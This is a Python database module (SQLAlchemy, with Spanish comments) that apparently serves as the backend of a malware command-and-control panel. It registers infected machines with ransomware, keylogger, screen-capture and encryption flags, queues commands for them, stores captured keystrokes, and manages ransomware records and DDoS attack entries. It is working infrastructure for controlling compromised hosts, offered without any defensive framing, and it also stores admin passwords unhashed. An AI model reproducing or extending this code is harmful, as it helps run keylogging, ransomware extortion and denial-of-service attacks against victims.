from sqlalchemy.orm import Session
import models, schemas
from werkzeug.security import generate_password_hash

def get_admins(db: Session):
    return db.query(models.Admin).all()

def create_admin(db: Session, admin: models.Admin):
    #hashed_password = generate_password_hash(admin.hashed_password)
    db_admin = models.Admin(username=admin.username, password=admin.password)
    db.add(db_admin)
    db.commit()
    db.refresh(db_admin)
    return db_admin


def create_client(db: Session, client: schemas.ClientCreate):
    db_client = models.Client(
        client_id=client.client_id,
        ip_address=client.ip_address,
        operating_system=client.operating_system,
        ransomware=client.ransomware,
        keylogger=client.keylogger,
        screencapture=client.screencapture,
        cifrado=client.cifrado
    )
    db.add(db_client)
    db.commit()
    db.refresh(db_client)
    return db_client
    

def get_clients(db: Session, skip: int = 0, limit: int = 100):
    return db.query(models.Client).offset(skip).limit(limit).all()

def create_command(db: Session, command: schemas.CommandCreate):
    db_command = models.Command(client_id=command.client_id, command=command.command, executed=False)
    db.add(db_command)
    db.commit()
    db.refresh(db_command)
    return db_command

def get_commands(db: Session, skip: int = 0, limit: int = 100):
    return db.query(models.Command).offset(skip).limit(limit).all()


def get_commands_by_client_id(db: Session, client_id: int, skip: int = 0, limit: int = 100):
    return db.query(models.Command).filter(models.Command.client_id == client_id).offset(skip).limit(limit).all()

def upsert_keystroke_log(db: Session, keystroke_log: schemas.KeystrokeLogCreate):
    # Usa keystroke_log.client_id para obtener el client_id
    db_log = db.query(models.KeystrokeLog).filter(models.KeystrokeLog.client_id == keystroke_log.client_id).first()

    if db_log:
        # Actualiza el registro existente
        db_log.text = keystroke_log.text
    else:
        # Crea un nuevo registro
        db_log = models.KeystrokeLog(client_id=keystroke_log.client_id, text=keystroke_log.text)
        db.add(db_log)

    db.commit()
    db.refresh(db_log)
    return db_log
 
def get_keystroke_logs(db: Session, skip: int = 0, limit: int = 100):
    return db.query(models.KeystrokeLog).offset(skip).limit(limit).all()

def delete_command(db: Session, command_id: int):
    db_command = db.query(models.Command).filter(models.Command.id == command_id).first()
    if not db_command:
        return None
    db.delete(db_command)
    db.commit()
    return db_command

def create_ransomware_data(db: Session, ransomware_data: schemas.RansomwareDataCreate):
    db_ransomware_data = models.RansomwareData(**ransomware_data.dict())
    db.add(db_ransomware_data)
    db.commit()
    db.refresh(db_ransomware_data)
    return db_ransomware_data

def get_ransomware_data(db: Session, client_id: int):
    return db.query(models.RansomwareData).filter(models.RansomwareData.client_id == client_id).first()

def get_all_ransomware_data(db: Session):
    return db.query(models.RansomwareData).all()

def create_ddos_attack(db: Session, ddos_attack: schemas.DDoSAttackCreate):
    db_ddos_attack = models.DDoSAttack(**ddos_attack.dict())
    db.add(db_ddos_attack)
    db.commit()
    db.refresh(db_ddos_attack)
    return db_ddos_attack

def get_ddos_attacks(db: Session, skip: int = 0, limit: int = 100):
    return db.query(models.DDoSAttack).offset(skip).limit(limit).all()

def update_client(db: Session, client_id: int, updated_data: schemas.ClientUpdate):
    db_client = db.query(models.Client).filter(models.Client.id == client_id).first()
    if db_client is None:
        return None

    for var, value in vars(updated_data).items():
        if value is not None:
            setattr(db_client, var, value)

    db.commit()
    db.refresh(db_client)
    return db_client

def update_command(db: Session, command_id: int, command_data: schemas.CommandUpdate):
    db_command = db.query(models.Command).filter(models.Command.id == command_id).first()
    if not db_command:
        return None

    for var, value in vars(command_data).items():
        if value is not None:
            setattr(db_command, var, value)

    db.commit()
    db.refresh(db_command)
    return db_command

def update_ransomware_data(db: Session, client_id: int, ransomware_data: schemas.RansomwareDataUpdate):
    db_data = db.query(models.RansomwareData).filter(models.RansomwareData.client_id == client_id).first()
    if not db_data:
        return None

    for var, value in vars(ransomware_data).items():
        if value is not None:
            setattr(db_data, var, value)

    db.commit()
    db.refresh(db_data)
    return db_data

def delete_ransomware_data(db: Session, client_id: int):
    ransomware_data = db.query(models.RansomwareData).filter(models.RansomwareData.client_id == client_id).first()
    if ransomware_data:
        db.delete(ransomware_data)
        db.commit()
        return True
    else:
        return False

def update_client(db: Session, client_id: int, client_data: schemas.ClientUpdate):
    db_client = db.query(models.Client).filter(models.Client.id == client_id).first()
    if not db_client:
        return None

    for key, value in client_data.dict(exclude_unset=True).items():
        setattr(db_client, key, value)

    db.commit()
    db.refresh(db_client)
    return db_client

def upsert_ddos_attack(db: Session, ddos_attack_id: int, ddos_attack_data: schemas.DDoSAttackCreateOrUpdate):
    db_ddos_attack = db.query(models.DDoSAttack).filter(models.DDoSAttack.id == ddos_attack_id).first()

    if db_ddos_attack:
        # Actualiza el ataque DDoS existente
        for key, value in vars(ddos_attack_data).items():
            if value is not None:
                setattr(db_ddos_attack, key, value)
        db.commit()
        db.refresh(db_ddos_attack)
    else:
        # Crea un nuevo ataque DDoS
        new_ddos_attack = models.DDoSAttack(**ddos_attack_data.dict(), id=ddos_attack_id)
        db.add(new_ddos_attack)
        db.commit()
        db.refresh(new_ddos_attack)
        db_ddos_attack = new_ddos_attack

    return db_ddos_attack


def create_or_update_ransomware_data(db: Session, client_id: int, ransomware_data: schemas.RansomwareDataCreateOrUpdate):
    existing_data = db.query(models.RansomwareData).filter(models.RansomwareData.client_id == client_id).first()

    if existing_data:
        for var, value in vars(ransomware_data).items():
            if value is not None:
                setattr(existing_data, var, value)
        db.commit()
        db.refresh(existing_data)
        return existing_data
    else:
        new_data = models.RansomwareData(**ransomware_data.dict(), client_id=client_id)
        db.add(new_data)
        db.commit()
        db.refresh(new_data)
        return new_data